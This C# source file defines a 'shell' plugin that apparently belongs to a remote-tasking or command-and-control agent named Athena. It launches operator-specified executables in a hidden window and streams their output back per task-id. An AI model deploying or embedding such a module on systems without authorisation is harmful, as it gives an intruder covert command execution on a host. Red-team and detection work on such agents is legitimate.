using Athena.Models;
using Athena.Commands.Models;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Athena.Commands;
using Athena.Models.Responses;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class Shell : IPlugin
    {
        public string Name => "shell";

        public bool Interactive => false;

        Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
        public void Start(Dictionary<string, string> args)
        {
            try
            {
                TaskResponseHandler.AddResponse(ShellExec(args));
            }
            catch (Exception e)
            {
                //oh no an error
                TaskResponseHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
        public void Kill(Dictionary<string, string> args)
        {
            try
            {
                if (runningProcs.ContainsKey(args["task-id"]))
                {
                    runningProcs[args["task-id"]].Kill();
                    runningProcs[args["task-id"]].WaitForExit();

                    TaskResponseHandler.AddResponse(new ResponseResult()
                    {
                        task_id = args["task-id"],
                        process_response = new Dictionary<string, string> { { "message", "0x0D" } },
                        completed = true,
                    });
                }
            }
            catch (Exception e)
            {

                TaskResponseHandler.AddResponse(new ResponseResult()
                {
                    task_id = args["task-id"],
                    user_output = e.ToString(),
                    completed = true,
                    status = "error",
                });
            }
        }
        public ResponseResult ShellExec(Dictionary<string, string> args)
        {
            string parameters = "";
            if (!String.IsNullOrEmpty(args["arguments"]))
            {
                parameters = args["arguments"];
            }

            string executable = args["executable"];
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = executable,
                    Arguments = parameters,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            try
            {
                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) TaskResponseHandler.Write(errorLine.Data + Environment.NewLine, args["task-id"], false, "error"); };
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) TaskResponseHandler.Write(outputLine.Data + Environment.NewLine, args["task-id"], false); };

                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();

                process.WaitForExit();
                ResponseResult result = new ResponseResult()
                {
                    user_output = Environment.NewLine + "Process Finished.",
                    task_id = args["task-id"],
                    completed = true,
                };

                if (process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                }
                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = Environment.NewLine + e.ToString(),
                    task_id = args["task-id"],
                    completed = true,
                    status = "error"
                };
            }
        }

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }
    }
}
